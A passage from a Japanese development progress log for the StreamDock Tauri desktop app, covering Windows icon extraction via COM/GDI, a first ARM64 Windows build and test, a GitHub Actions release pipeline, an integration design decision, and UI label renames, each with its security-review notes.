- **主経路 `extract_via_shell_image`**: `CoInitializeEx(None, COINIT_APARTMENTTHREADED)` →
  `SHCreateItemFromParsingName::<_,_,IShellItemImageFactory>(PCWSTR, None IBindCtx)` →
  `GetImage(SIZE{128,128}, SIIGBF_ICONONLY|SIIGBF_BIGGERSIZEOK)` → `HBITMAP` → `hbitmap_to_rgba` →
  `image::RgbaImage::from_raw` → 共有 `super::encode_png_base64`。
- **フォールバック `extract_via_file_info`**: `SHGetFileInfoW(SHGFI_ICON|SHGFI_LARGEICON)` → `HICON` →
  `GetIconInfo` → カラー `HBITMAP` → 同 `hbitmap_to_rgba`。`.ico` 直接指定や主経路不可環境の保険。
- **共通 DIB 変換 `hbitmap_to_rgba`**: `GetObjectW`(BITMAP) で幅/高さ → `GetDC(NULL)` の画面 DC →
  `BITMAPINFOHEADER`（`biHeight` 負＝top-down・32bpp・`biCompression=0(BI_RGB)`）で `GetDIBits` →
  32bpp BGRA を取得 → **B↔R スワップで RGBA 化**（premultiplied alpha は表示用途で許容）。
- すべて失敗で `None`（→ `extract_app_icon` が `Ok(None)` → 文字フォールバック）。
- **リソース解放方式＝RAII ガード**（ユーザー承認済み）: `ComGuard`（`CoUninitialize`・自分が初期化した
  S_OK/S_FALSE 時のみ true・`RPC_E_CHANGED_MODE` では uninit しない）/ `OwnedHBitmap`（`DeleteObject`）/
  `OwnedHIcon`（`DestroyIcon`）/ `ScreenDc`（`ReleaseDC`）の Drop で全 early-return・`?` 経路を網羅。
  **Rust の逆順 Drop により COM インターフェース Release が `CoUninitialize` より先**に走る宣言順にしてある
  （`_com` を関数先頭で宣言）。`GetIconInfo` の `hbmColor`/`hbmMask` は両方 `DeleteObject`。`unsafe` は各 FFI
  呼び出し単位の最小スコープに限定。

### 机上整合（windows 0.58 実ソースで確認済み）

- `~/.cargo/registry/cache/.../windows-0.58.0.crate` を展開し、使用 API の実シグネチャ・feature gate・struct の
  `Default` 実装・`HBITMAP: CanInto<HGDIOBJ>` を照合済み。macOS では `cargo check` 対象外のため**机上整合のみ**。

### セキュリティレビュー結果（security-review 実施済み・必須）

- 判定: **問題なし**（018 のセキュリティ姿勢を Windows へ逸脱なく拡張）。修正必須項目なし。
- 確認済み: 読み取り専用（`GetImage`/`SHGetFileInfoW`/GDI はアイコン取得のみ・write/delete/network なし・§1/§5）/
  新規 command・capabilities を増やさず 018 の `extract_app_icon` を流用（追加は `windows` feature のみで Tauri ACL
  権限ではない・§3/§10）/ 抽出対象は `validate_icon_path` 通過パスのみ（§7/§8。macOS の CFBundleIconFile のような
  二次パス解決＝トラバーサル面は Windows 経路に無い）/ 出力 ≤128px・エラーは `Ok(None)` に丸めフルパス/OS エラー
  非露出・ログ追加なし（§9）/ COM 解放順序が逆順 Drop で正しい・ハンドル/COM を全経路で解放/ `csp:null` 不変・
  `data:` inline のみ・外部通信ゼロ。

### 検証結果（本タスク＝macOS 上）

- `cd apps/desktop/src-tauri && cargo check` → **成功**（共通化リファクタ・依存再配置で mac 経路は非退行。
  ※ `#[cfg(windows)] mod windows` は macOS では**コンパイルされない**）。
- `pnpm --filter ./apps/desktop typecheck` → 成功 / `pnpm --filter ./apps/desktop lint` → 成功（frontend 変更なし・再確認）。
- 実機 macOS（`.app` 実アイコン抽出の非退行）はユーザー環境での確認をお願いしたい（コード上 mac 経路は
  呼び出しパス変更と依存再配置のみで出力不変）。

### 未検証範囲（本タスクの完了条件に含めない・098 Windows Build へ持ち越し）

- `#[cfg(windows)] mod windows` は **macOS では `cargo check` 未走・実機未確認**。型・API 名・unsafe FFI は
  windows 0.58 実ソースとの**机上整合のみ**。既存 `process/service.rs::mod windows`（前面化）と同じ
  「macOS で書いて Windows ビルドで初検証」扱い。098 でコンパイルエラー/不具合が出たら **098 側で最小修正**する前提。
- 098 で確認: Windows ARM64(VM) の `cargo check` / `cargo clippy`（`mod windows` 初コンパイル）/ `.exe`
  （メモ帳/OBS/Chrome 等）登録時に実アイコンがプレビュー・一覧・サイドバー・プリセット追加に表示される /
  アイコン無し `.exe` は文字フォールバックしクラッシュしない / 再起動後もアイコン保持 / ハンドル・COM リークが無いこと。

### やらないこと（維持）

- frontend / DB スキーマ / `extract_app_icon` の I/F・出力仕様の変更（018 の配線をそのまま流用）/ macOS 抽出
  ロジックの挙動変更（`encode_png_base64` の移動のみ）/ Linux のアイコン抽出（`Ok(None)`）/ `.lnk` 実体解決・
  `.bat` 対応・手動アップロード・差し替え・加工 / 一覧表示時の都度再抽出 / 高解像度化の追加依存
  （`SHGetImageList`/`SHIL_JUMBO` 等・まず 128px で十分か 098 実機で判断）/ 新規クレート追加（`windows` feature 追加のみ）。

### 変更ファイル

- `apps/desktop/src-tauri/Cargo.toml`（image/base64 を共通へ・windows feature 4つ追加＋理由コメント）
- `apps/desktop/src-tauri/src/tools/icon.rs`（共通化リファクタ＋`#[cfg(windows)] mod windows` 新設）
- `docs/progress.md`（本節）/ `docs/security.md`（028 の未検証注記を追記）

## 2026-07-12 098 Windows Build（Windows 11 ARM64 実機で初コンパイル・初 E2E・インストーラ生成）

macOS でしか動かしていなかった MVP を、UTM(QEMU) の **Windows 11 ARM64** VM 上で初めてビルド・起動・E2E した。
一度も Windows でコンパイルされていなかった `#[cfg(windows)]` コード（前面化・028 アイコン抽出・windows 0.58）を
`aarch64-pc-windows-msvc` で初コンパイルし、コア導線と要注意フローを実機確認、ARM64 インストーラ（.exe/.msi）まで生成した。

### 環境（(A)・手作業）

- VM: UTM(QEMU) / Windows 11 ARM64。ツールチェイン（すべて ARM64）: rustup ＋ `aarch64-pc-windows-msvc`（ネイティブ）、
  VS Build Tools ARM64（**MSVC v143 ARM64/ARM64EC ビルドツール**＋Windows SDK）、Node 24（20+ 要件を満たす）＋pnpm 10.33、Git for Windows。
- **詰まった点＝ブロッカーと解消**: `cargo check` で `error: linker link.exe not found`。原因は VS Build Tools に **ARM64 用 VC ツールが未導入**
  （`vswhere -requires Microsoft.VisualStudio.Component.VC.Tools.ARM64` が空）。**「MSVC v143 - VS 2022 C++ ARM64/ARM64EC ビルドツール」を
  追加インストール**して解消。以後リンク成功。

### (B) 静的検査＝初コンパイル（全クリーン・コード修正ゼロ）

- `cargo check` → **成功**。`#[cfg(windows)] mod windows` ×2（`process/service.rs` 前面化 / `tools/icon.rs` 028 抽出）と
  windows 0.58 の全 feature/型/API が**初コンパイルでエラーなし**。事前に懸念した GDI/COM の型（`DeleteObject`/`GetObjectW` の
  `HGDIOBJ` 変換等）は windows 0.58 で問題なし。→ **028 の未検証 Windows コードは修正不要で通過**。
- `cargo clippy` → 警告なし。`pnpm typecheck` / `pnpm lint`（root）→ ともにエラーなし。

### (C) 実機起動・E2E（`pnpm tauri dev`）

- 見た目: フレームレス表示（`set_decorations(false)`）・自作 min/max/close・ドラッグ移動・タイトル二重表示/リサイズ破綻なし → OK。
- コア導線: `.exe` 登録（絶対パス検証）/ URL ツール（既定ブラウザ・023）/ プリセット作成→**一括起動→一括停止** / 個別起動・停止・
  ランタイムステータス → 全 OK。
- 要注意フロー（重点・progress.md 既知 TODO の解消）:
  - **「開く」で既存インスタンス前面化・二重起動しない**（`focus_by_pid`/`SetForegroundWindow`）→ **確認 OK**（未実施だった E2E を解消）。
  - **autostart**: OS スタートアップ（レジストリ Run キー）の登録・解除・`--autostart` 起動 → 確認 OK。
  - **028 アイコン抽出の実機初検証**: `.exe` の実アイコンがプレビュー/一覧/サイドバー/プリセットに表示・抽出不可は文字フォールバック・
    繰り返し登録で不安定化なし（**ハンドル/COM リーク兆候なし**）→ 確認 OK。

### 直した箇所（最小修正の内容と理由）

- **`apps/desktop/src-tauri/icons/icon.ico` の再生成のみ**（Windows 専用ファイル。macOS の `icon.icns` は未変更＝macOS 挙動不変）。
  - 理由: Windows のタスクバー等でアプリアイコンが他アプリより小さく見えた。原因は元アイコンが **macOS 慣習の余白（青い角丸が
    キャンバスの ~81%・四隅 ~9.4% 透明）** を持ち、端まで絵を敷く Windows で相対的に小さく見えるため。
  - 対応: ユーザー提供の**端まで敷いた高解像度素材（1254px）**から、角丸半径 ~176px の**透過マスク**（四隅を透明化・白い角を出さない）を
    当て、16/24/32/48/64/128/256px を**元画像から直接縮小レンダリング**して `.ico` を再生成（拡大由来のボケなし）。`tauri.conf.json` は変更せず。
  - Rust / frontend のコード変更は **一切なし**（(B) で修正ゼロ）。

### (C-4) インストーラ生成

- `pnpm tauri build` で **ARM64 の `.exe`(NSIS) と `.msi`(WiX) の両方を生成**（縮退なし。WiX が ARM64 で不可なら `.exe` のみに
  縮退する方針だったが、今回は両方生成できた）。インストール → 起動 → 新アイコン表示まで確認。
- 署名なしのため SmartScreen 警告は想定内（署名・公証は 099）。

### security-review 結果（前面化 / 028 unsafe FFI・実施済み＝必須）

- 判定: **問題なし**（修正必須なし）。progress.md 既知 TODO だった「前面化 / focus_process / windows クレートの security-review 未実施」を**解消**。
- 確認済み（docs/security.md 準拠）: `focus_process` は frontend から **launchId のみ**受け取り raw PID/HWND を受けない・前面化対象は
  **registry 保持の自分が起動した PID とその子孫**に限定・**プロセス名では探さない**（§6）/ registry に無い launchId は新規起動せず二重起動を根絶 /
  ウィンドウは `GetWindowTextLengthW` の**長さだけ**判定しタイトル文字列を読まない・エラー固定文言・ログ露出なし（§9）/ shell 非経由・
  外部通信/ファイル操作なし（§1/§4/§5）/ 028 は RAII ガードで全 early-return・`?` 経路のハンドル/COM 解放・COM Release→`CoUninitialize` の
  drop 順が正しい・`CloseHandle(snapshot)` 実施（リーク兆候なしの E2E と整合）/ 新規 crate なし（windows feature 追加のみ・§10）/ `csp:null` 不変。
- **既知の限界（記録のみ・修正不要）**: `collect_process_tree` は PID 再利用時に無関係な PID を子孫集合に含めうる（深さ 8/件数 1024 で保護）。
  ただし操作は**前面化のみ（kill しない）**で実害は「無関係なウィンドウが前面に出る」程度・低頻度。停止経路のような exe/start_time 照合の
  追加は前面化の低リスクに対し過剰なため据え置き。

### 完了条件の達成状況

- cargo check / clippy 通過 ✓ / typecheck・lint 通過 ✓ / dev でフレームレス＋min/max/close ✓ / ツール登録→プリセット作成→一括起動→一括停止 ✓ /
  「開く」で前面化・二重起動しない ✓ / autostart 登録・解除・`--autostart` ✓ / 028 アイコン抽出の実機表示・フォールバック・リーク無し ✓ /
  ARM64 `.exe`(NSIS) ＋ `.msi`(WiX) インストーラ生成・インストール・起動 ✓ / 前面化 security-review 実施＝問題なし ✓。

### 残課題

- コード署名 / 公証（署名なし SmartScreen 警告の解消）は **099** で対応。
- x86_64(x64) Windows 検証は本タスク対象外（ARM64 限定）。
- macOS 側の `.app` 実アイコン抽出の非退行（028 由来）は macOS 実機での確認継続（本タスクでは Windows のみ検証）。

### やらないこと（維持）

- macOS 挙動変更・共通ロジックの大規模リファクタ / Linux ビルド / CI 自動 Windows ビルド / 新機能追加（ビルド・起動に不可欠な最小修正のみ＝
  今回は icon.ico の再生成のみ）/ 新規 npm・crate・plugin 追加。

### 変更ファイル

- `apps/desktop/src-tauri/icons/icon.ico`（Windows アプリアイコン再生成のみ。macOS の `icon.icns` は不変）
- `docs/progress.md`（本節）/ `docs/security.md`（§098 の実検証・security-review 済み注記を追記）

## 2026-07-12 099 User Test Package フェーズ1（配布 CI・GitHub Actions で Mac/Win(x64) 自動ビルド）

ユーザー配布の基盤を作る。ビルド自動化の方式（Docker/VM 可否）と署名の要否という2つの問いに答え、
**GitHub Actions（クラウド CI）**で macOS と Windows(x64) のインストーラを自動生成し **GitHub Releases** へ
配布する仕組みを入れた。**アプリ本体のコード変更なし**（配布設定・ドキュメントのみ）。

### 背景の結論（2つの問いへの回答）

- **Docker で Windows ビルド不可**: Windows コンテナは Windows ホストが要り Apple Silicon Mac で動かない
  （Mac の Docker は Linux のみ）。Tauri もクロスコンパイル不可。
- **VM も不要にできる**: 配布ターゲットを **Windows x64**（一般ユーザーのほぼ全員・ARM64 でも x64 エミュで動作）
  にすれば windows-latest（x64）クラウドランナーでビルドでき、VM/Docker 不要。098 の ARM64 VM は配布に使わない。
- **署名は必要**（未署名は SmartScreen/Gatekeeper 警告）。ユーザー方針＝**Windows のみ署名**（証明書取得後に追加）。

### 決定事項

- ビルド自動化 = GitHub Actions / Windows = **x64 のみ**（`x86_64-pc-windows-msvc`）/ macOS = **universal(.dmg)・未署名** /
  署名 = **Windows のみ**（フェーズ2）/ 配布 = **GitHub Releases**（登録不要 DL）。窓の杜/Vector は別途手動申請。

### フェーズ1（本セッションで実装＝未署名・費用ゼロ）

- **配布方式の決定（ソース非公開のまま配布）**: このリポジトリ（`stream-dock`）は **private のまま**、
  成果物だけを **別の public リポジトリ `satoh23/StreamDock-releases`** の Releases に置く。理由: GitHub Releases で
  「アカウント登録なしに誰でも DL」できるのは public リポジトリのみだが、ソースまで公開したくない（パクられ懸念）ため、
  バイナリ専用の public リポジトリに分離する。private の Actions から別リポジトリへ書くため `GITHUB_TOKEN` は使えず、
  Secrets `RELEASE_REPO_TOKEN`（public 側 Contents: R/W な Fine-grained PAT）を使う。
- `.github/workflows/release.yml`（新規）: 2 ジョブ構成。
  - `build`（macos-latest / windows-latest マトリクス）: tauri-action で**ビルドのみ**（tagName 未指定＝Release は作らない）→
    生成物（dmg/nsis/msi）を `actions/upload-artifact` で保存。macOS は `--target universal-apple-darwin`（rust targets 2つ）、
    Windows は既定 x64。pnpm(action-setup)＋Node20＋Rust(stable)＋rust-cache＋`pnpm install --frozen-lockfile`。
  - `release`（ubuntu・`needs: build`）: 全成果物を `download-artifact` で集約 → `softprops/action-gh-release@v2` で
    **public `StreamDock-releases` に Release 下書き**作成・添付（`repository` + `token: RELEASE_REPO_TOKEN`）。
  - 2 ジョブに分けたのは、両 OS が同じ Release を同時作成する競合を避け、公開先を1回の集約で作るため。
  - `permissions: contents: read`（公開先へは PAT を使うため本リポジトリ側は読み取りのみ）。
- `README.md`: リリース手順（前提＝public リポジトリ＋`RELEASE_REPO_TOKEN`／タグの打ち方・手動実行・生成物・未署名時の警告回避・
  ローカル `pnpm tauri build`）を追記。
- `docs/tasks/099-user-test-package.md`（新規スペック）。

### フェーズ2（未実装・証明書取得後）

- Windows 署名: `tauri.conf.json` に `bundle.windows.signCommand` ＋ workflow に署名ステップ・GitHub Secrets を追加。
  証明書はユーザー取得（Azure Trusted Signing 最安・要身元確認 / OV+Key Vault / OV・EV）。発行に数日〜数週間。

### セキュリティ（docs/security.md 準拠）

- アプリの OS/プロセス/ファイル操作の設計は不変（配布のみ・§2/§4/§5）。新規 crate/npm/plugin 追加なし
  （tauri-action は CI 上の Action・§10）。外部通信/telemetry/CSP 不変（§1/§CSP）。署名鍵は GitHub Secrets のみ（フェーズ2）。

### 検証（実装後にユーザーが実施）

- テストタグ `v0.0.1-test` を push（or Actions 画面から `release` を手動実行）→ Actions 緑 → Releases 下書きに
  macOS `.dmg` と Windows x64 `.exe`/`.msi` が並ぶ → Windows `.exe` を DL・インストール・起動（実機 or ARM64 VM の x64 エミュ）。

### 残課題

- フェーズ2（Windows 署名・証明書取得後）/ macOS 署名・notarize（別途）/ 自動アップデータ / 窓の杜・Vector 手動申請 /
  x64 実機での最終確認（現状 x64 実機が無く、ARM64 VM の x64 エミュ or ユーザーテストで代替）。

### 変更ファイル

- `.github/workflows/release.yml`（新規）/ `docs/tasks/099-user-test-package.md`（新規）/ `README.md`（リリース手順追記）/ `docs/progress.md`（本節）

## 2026-07-13

### 032 らくらくツール設定 設計確定（棒読みちゃん×VOICEVOX 連携）

別チャットで仕様を詰め、`docs/tasks/032-rakuraku-auto-setup-design.md` を「設計中プレースホルダ」から
**設計確定版**へ書き換えた。実装は **032a（画面枠組み）/ 032b（棒読み×VOICEVOX 連携）** に分割し、
`docs/task-board.md` の Todo に反映した。**本タスク（設計）はコード・依存・capability・security.md/product.md
本文を一切変更していない**（改訂は 032b で security-review と同時に行う）。

#### 確定した決定事項（論点 1〜5）

- **自動化の境界＝「設定書換のみ自動」**。棒読みちゃん自身の設定（Socket 連携 ON・声質＝`VOICEVOX:ずんだもん`）
  のみをバックアップ先取りで書換。**インストーラの自動DL/実行と SAPI 音声登録は自動化せず誘導のみ**
  （未署名第三者バイナリ実行・昇格を伴うシステム全体への不可逆変更・中途半端な失敗・AV/SmartScreen 中断・
  保守/信用リスクが高いため。ユーザーへリスクを明示し合意）。
- **対応OS**: 画面枠組みは Windows/macOS 両対応＋**OS 対応バッジ（Windows専用/Mac専用/両OS対応）**。
  棒読み×VOICEVOX 連携は**棒読みちゃん依存で Windows 専用**（028 前例に倣い mac では未検証、098 で初検証）。
- **セキュリティ方針**: `docs/security.md` に**新章で限定解禁**（①ループバック 127.0.0.1 限定通信 ②自動DL/
  実行なし＝公式ページ誘導 ③外部設定書換は可逆＋バックアップ必須・SAPI 等の不可逆変更は誘導のみ ④明示同意
  ⑤security-review 必須）。`docs/product.md` の「設定ファイル自動上書き＝対象外」に本機能を例外として追記。
- **技術/依存**: VOICEVOX REST 用に **`ureq`（ブロッキング HTTP・ループバックのみ）** を追加予定
  （`reqwest` は tokio/async を引き込み同期コマンド構成と不整合のため不採用）。棒読みへのテスト送信は
  `std::net::TcpStream`（新規依存なし）。**Tauri capability 追加なし・`csp: null` 不変**。
- **MVP スコープ**: 棒読み×VOICEVOX 1 連携・**TTS 半分に限定**（コメントビューア連携＝コメント取り込みは対象外）。
  設定解除・設定状況管理・設定更新は対象外。バックアップはファイルのみ（SQLite 状態記録なし）。

#### per-integration アーキテクチャ

- TS `src/features/rakuraku/`（連携の静的レジストリ: OS 対応可否・同意/免責テンプレ・ステップ定義）＋
  `src/screens/rakuraku-tools/`（一覧→詳細→同意→実行）。
- Rust `src-tauri/src/rakuraku/{mod,commands,service,model}` ＋ `integrations/bouyomi_voicevox`。
  共通トレイト `Integration`（scan/configure/verify）。コマンドは `rakuraku_scan/configure/verify_integration`。

#### 変更ファイル

- `docs/tasks/032-rakuraku-auto-setup-design.md`（設計確定版へ書換）/ `docs/tasks/032a-rakuraku-tools-screen.md`（新規）/
  `docs/tasks/032b-bouyomi-voicevox-integration.md`（新規）/ `docs/task-board.md`（032 分割・032a/032b 追加）/
  `docs/progress.md`（本節）。

### 029 StreamDock Naming Consistency

ユーザー可視の表示名を **StreamDock** に統一した。frontend の固定文言と window タイトルの変更に加え、
実装後の確認でメニューバー/Dock の OS アプリ名が `stream-dock` のままと判明したため、**ユーザー判断で
`productName` も追加変更**した（当初 029 では据え置き予定だったスコープを拡張）。ロジック・API・DB スキーマ・
OS/ファイル/プロセス操作・外部通信・依存は一切変更していない。

#### 変更した3箇所（ユーザー可視の表示名）

- `apps/desktop/index.html:7` — `<title>Tauri + React + Typescript</title>`（Vite 雛形のまま）→ `<title>StreamDock</title>`。
- `apps/desktop/src-tauri/tauri.conf.json:15` — ネイティブ window `"title": "stream-dock"` → `"StreamDock"`。
- `apps/desktop/src/screens/diagnostics/DiagnosticsScreen.tsx:29` — 診断サマリー本文 `"stream-dock 診断サマリー"` → `"StreamDock 診断サマリー"`。

いずれもユーザー入力を扱わない固定文字列（§8 非該当）。3箇所の該当行のみを編集し、周辺行・他の
`stream-dock` 表記には触れていない。

#### 追加変更（productName — ユーザー判断でスコープ拡張）

- `apps/desktop/src-tauri/tauri.conf.json:3` `productName: "stream-dock"` → `"StreamDock"`。メニューバー/Dock の
  OS アプリ名（バンドル `.app` 名・CFBundleName）の出どころ。当初 029 は 098/099 への波及を理由に据え置き予定だったが、
  実装後にユーザーへ影響を提示し「今変更する」と判断された（公開配布前が改名のクリーンなタイミング）。
- **データ安全性を確認済み**: DB パスは `app_data_dir()`（＝`identifier` `com.tetsuya.stream-dock` 由来）＋ 固定
  ファイル名 `stream-dock.db`（`lib.rs:39`）。localStorage キーも固定文字列。いずれも `productName` に依存しないため、
  改名しても既存ユーザーのデータ/設定は移動・破損しない。据え置き理由はデータ破損ではなく配布成果物名への波及だった。
- **波及チェック**: README / `.github` / `docs/tasks/099` に成果物名 `stream-dock_*.dmg` 等の直書き参照はなく、更新不要。
  release.yml は tauri-action + glob 収集のため productName 変更を自動追従（成果物名が `StreamDock_*` になる）。
- **dev では未反映**: `tauri dev` は実行バイナリ `target/debug/stream-dock`（Cargo `name`）を直接起動するため、dev の
  メニューバー/Dock 名は `stream-dock` のまま。反映が見えるのは `pnpm tauri build` で作る実バンドルのみ。dev 名を
  変えるには crate 改名が必要だが、既存ビルド/参照互換のため据え置く（下記）。

#### 据え置いた技術識別子（変更すると壊れるため意図的に不変）

- `tauri.conf.json:5` `identifier: com.tetsuya.stream-dock` / `package.json`（root `stream-dock-workspace` / desktop `stream-dock`）/
  `src-tauri/Cargo.toml` の `name = "stream-dock"` / `stream_dock_lib` / `main.rs:5` `stream_dock_lib::run()` — 既存ビルド/パッケージ互換のため不変。
- `src-tauri/src/lib.rs:39` DB ファイル名 `stream-dock.db`、localStorage キー `stream-dock.theme`（`theme.ts:5`）/ `stream-dock.tutorial.completed`（`tutorialStorage.ts:8`）— 既存ユーザーのデータ/設定を壊さないため不変。
- 既に正しい `Header.tsx:43` wordmark / `tutorialSteps.ts:46`、プロトタイプ HTML・コメント内のプロジェクト名参照も対象外（再変更なし）。

#### セキュリティ（docs/security.md 準拠）

- 表示文字列と window タイトルのみの変更。OS/ファイル/プロセス操作を追加せず（§2/§4/§5）、新しい Tauri command / capabilities / 依存を追加していない（§3/§10）。外部通信・外部リソース読み込みを増やさず `csp: null` も不変（§1/§CSP）。

#### 検証

- `git diff` で `tauri.conf.json` は productName(:3) と window title(:15) の2行のみ変更、`identifier`(:5)・Cargo `name`/`stream_dock_lib`・DB ファイル名 `stream-dock.db`・localStorage キーは無傷を確認。`tauri.conf.json` は `python3 -c json.load` で妥当性確認済み。
- `pnpm --filter ./apps/desktop typecheck` = pass（exit 0）。`pnpm --filter ./apps/desktop lint` = pass（exit 0）。※productName は tauri.conf.json のため typecheck/lint の検査対象外（JSON 妥当性で担保）。
- Vite キャッシュ（`node_modules/.vite`）を削除済み（初回「反映されない」対応）。
- 実機表示はユーザー環境で目視確認予定: 診断サマリー＝`StreamDock 診断サマリー`（dev で確認可）／window title＝`StreamDock`（`hiddenTitle:true` のため macOS タイトルバーには非表示・「ウィンドウ」メニュー等で確認）／メニューバー・Dock の OS 名＝`StreamDock` は **`pnpm tauri build` の実バンドルで確認**（dev では `stream-dock` のまま）。

#### 変更ファイル

- `apps/desktop/index.html` / `apps/desktop/src-tauri/tauri.conf.json`（title + productName） / `apps/desktop/src/screens/diagnostics/DiagnosticsScreen.tsx` / `docs/progress.md`（本節）。

### 030 "登録" Wording Unification

プリセット/ツールの**新規作成**アクションの動詞を、画面によって「追加」「登録」で割れていたのを既存の
「ツールを登録」に揃え **新規作成は「登録」に統一**した。位置語（末尾/先頭に追加）・既存ツールをプリセットへ
足す操作（＋ツールを追加・保存して追加）は意味が異なるため **「追加」のまま維持**。frontend の表示文字列のみで
ロジック・API・DB スキーマ・Rust は一切変更していない。同一画面内で「変える追加」と「維持する追加」が混在する
ため、機械的一括置換をせず**意味（新規作成 vs 位置語/既存ツール追加）で1件ずつ判別**した。

#### 「登録」に統一した箇所（A・新規作成の動詞）

- `Sidebar.tsx:39`（コメント `プリセット追加` → `プリセット登録`）/ `:113`（`＋ プリセットを追加` → `＋ プリセットを登録`）。
- `MainScreen.tsx:532`（空状態文 `プリセットを追加して…` → `…登録して…`）/ `:538`（`＋ プリセットを追加` → `＋ プリセットを登録`）。
- `AddPresetScreen.tsx:287` 新規時ページタイトル `プリセットを追加` → `プリセットを登録`（三項の新規側のみ・編集側 `プリセットを編集` は据え置き）。
- `AddToolScreen.tsx:212` 新規時見出し `ツールを追加` → `ツールを登録` / `:416` `ツール追加後プレビュー` → `ツール登録後プレビュー`
  （いずれも新規側のみ・編集側 `ツールを編集` / `編集後プレビュー` は据え置き）。
- `tutorialSteps.ts:103` 引用 `『＋ プリセットを追加』` → `『＋ プリセットを登録』`（A 変更後の実ボタン名と同期）。

#### サイドバー引用の不整合を是正した箇所（A2・ユーザー判断 B で追加）

- `MainScreen.tsx:639` / `AddPresetScreen.tsx:357` の本文引用「**サイドバーの**「＋ ツールを追加」」は、
  サイドバーの実ボタン `＋ ツールを登録`（`Sidebar.tsx:175`・本タスクで不変）と**既に不一致**だった（本タスク以前からの既存不整合）。
- タスク doc は当初この2件を「維持」に列挙していたが、目的(2)「引用を実ボタン名に一致させる」の趣旨と衝突するため、
  ユーザー判断（**B: 一緒に直す**）で引用語のみ `＋ ツールを追加` → `＋ ツールを登録` に是正した。
- 先頭の非引用「追加できるツールがありません」（`MainScreen:638`）等の「追加」は据え置き。`MainScreen:668-669` の同種引用は
  **プリセット内**ボタン（`:629`＝維持）を指すため整合しており不変。

#### 「追加」のまま維持した箇所と理由（触っていない）

- **位置語・追加位置**（意味が別）: `AddToolScreen.tsx:371`（プリセットには追加しない）/ `:382`（追加位置）/ `:389`（末尾に追加）/ `:390`（先頭に追加）。
- **既存ツールをプリセットへ足す**: `MainScreen.tsx:629`（＋ ツールを追加）/ `:657`（picker「追加」）/ `:668-669`、`AddToolScreen.tsx:409`（保存して追加）、`tutorialSteps.ts:94`（『保存して追加』引用）。
- **既に「登録」で正しい**: `Sidebar.tsx:175`、`tutorialSteps.ts:77-78`（変更不要）。
- **コメント/内部記述**（ユーザー非可視・対象外）: `MainScreen.tsx:104/108/214`、`AddPresetScreen.tsx:164/197`、`AddToolScreen.tsx:47/64/95/97/101/157`、`tutorialSteps.ts:62`。

#### セキュリティ（docs/security.md 準拠）

- frontend の表示文字列のみの変更。OS/ファイル/プロセス操作を追加せず（§2/§4/§5）、新しい Tauri command / capabilities / 依存を追加していない（§3/§10）。外部通信・外部リソースを増やさず `csp: null` も不変（§1/§CSP）。

#### 検証

- `git diff --stat` = 5 ファイル・10 挿入/10 削除。`git diff` で変更が A/A2 の該当行のみで、維持対象（位置語・既存ツール追加・保存して追加・`Sidebar:175`・`tutorialSteps:94`）に波及していないこと、`MainScreen:638` の非引用「追加」が無傷なこと、`tutorialSteps.ts:103` の引用が実ボタン名と一致することを確認。
- `pnpm --filter ./apps/desktop typecheck` = pass（exit 0）。`pnpm --filter ./apps/desktop lint` = pass（exit 0）。
- 実機表示（`pnpm --filter ./apps/desktop tauri dev`）はユーザー環境で目視確認予定: サイドバー/メイン空状態/プリセット登録画面/ツール登録画面/プレビューが「登録」に統一／位置語・既存ツールのプリセット追加は「追加」のまま／チュートリアル引用が実ボタン名と一致。

#### 変更ファイル

- `apps/desktop/src/components/Sidebar.tsx` / `apps/desktop/src/screens/main/MainScreen.tsx` / `apps/desktop/src/screens/add-preset/AddPresetScreen.tsx` / `apps/desktop/src/screens/add-tool/AddToolScreen.tsx` / `apps/desktop/src/features/tutorial/tutorialSteps.ts` / `docs/progress.md`（本節）。

## 2026-07-13 (031 Rakuraku Tool Settings Rename)

### 完了したこと

「らくらくツール**導入**」を「らくらくツール**設定**」に改名した。今後この画面で導入だけでなく設定等も行えるように
名称を「設定」へ寄せるための**名称変更のみ**のタスク。画面自体は 032 の新機能実装までは現状の ComingSoon（準備中）
プレースホルダのまま。frontend の表示文言のみの変更。

#### 改名した箇所（現行 → 変更後）

- (1) **ラベル**（単一ソース）: `headerSections.ts:22` `label` `"らくらくツール導入"` → `"らくらくツール設定"`。
  `App.tsx` が `comingSoonSection.label` をページ見出しに使うため、**サイドバー導線＋準備中ページ見出しの両方**に自動波及。
- (2) **説明文のリワード**: `headerSections.ts:26` `comingSoonDescription` の「ワンクリックで**導入**できる」→「ワンクリックで**設定**できる」。
- (3) **チュートリアル文言の同期**: `tutorialSteps.ts:62` の直書き引用 `『らくらくツール導入』` → `『らくらくツール設定』`
  （`HEADER_SECTIONS` を参照せず直書きのため (1) では自動反映されず、個別に手で同期）。
- (4) **コメント参照の更新**（非表示）: `ComingSoonScreen.tsx:5` のコメント内 `らくらくツール導入` → `らくらくツール設定`。

#### 据え置いた内部識別子（触っていない）

- `screen: "rakuraku-tools"`（`headerSections.ts:23` / `types.ts:8` / `App.tsx:241` / `Header.tsx:25` の型 union）。
  ローマ字 ID で「導入/設定」の語を含まないため不変。
- `implemented: false`（`headerSections.ts:24`）— 画面は準備中プレースホルダのまま維持。

#### セキュリティ（docs/security.md 準拠）

- frontend の表示文字列のみの変更。OS/ファイル/プロセス操作を追加せず（§2/§4/§5）、新しい Tauri command /
  capabilities / 依存を追加していない（§3/§10）。外部通信・外部リソース読み込みを増やしていない（§1/§CSP）。

#### 検証

- `git diff --stat` = 3 ファイル・4 挿入/4 削除。`git diff` で変更が (1)〜(4) の該当行のみで、内部識別子 `rakuraku-tools`
  （4 箇所）と `implemented:false` に波及していないこと、チュートリアル引用(:62)が新ラベル `らくらくツール設定` と
  一致することを確認。`らくらくツール導入` / 表示文言の「導入」の残存は grep で 0 件。
- `pnpm --filter ./apps/desktop typecheck` = pass（exit 0）。`pnpm --filter ./apps/desktop lint` = pass（exit 0）。
- 実機表示（`pnpm --filter ./apps/desktop tauri dev`）はユーザー環境で目視確認予定: ヘッダー導線・準備中ページ見出しが
  「らくらくツール設定」／説明文の「導入」が「設定」寄り／チュートリアル引用が新ラベルと一致／画面は準備中プレースホルダのまま。

#### 変更ファイル

- `apps/desktop/src/components/headerSections.ts` / `apps/desktop/src/features/tutorial/tutorialSteps.ts` /
  `apps/desktop/src/screens/coming-soon/ComingSoonScreen.tsx` / `docs/progress.md`（本節）。

## 2026-07-13 (032a Rakuraku Tools Screen 画面枠組み)

### 完了したこと

らくらくツール設定に「やりたいことベースの機能一覧 → 詳細 → 同意 → ワンクリック設定（実行）」の**画面枠組み（器）**を
実装した。親設計 [032](tasks/032-rakuraku-auto-setup-design.md) の決定に従属する 032a として、**frontend 中心・
